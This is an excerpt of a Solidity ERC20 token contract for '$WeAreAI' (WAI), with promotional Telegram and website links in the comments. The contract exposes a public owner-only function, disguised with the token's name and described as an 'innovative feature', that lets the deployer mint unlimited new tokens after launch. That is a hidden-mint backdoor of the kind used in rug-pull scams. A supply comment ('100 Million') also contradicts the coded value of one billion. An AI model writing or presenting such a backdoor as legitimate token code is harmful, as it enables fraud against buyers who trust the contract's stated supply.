...
//
// $WeAreAI proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/WeAreAI
//  🌐 Website:https://WeAreAI.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _WeAreAI(uint256 amount) public onlyOwner {
 _WeAreAI(msg.sender, amount);
    }
    ...
    function _WeAreAI(address account, uint256 amount) internal virtual {
...
contract $WeAreAI is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("We Are AI", "WAI") {
     _WeAreAI(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}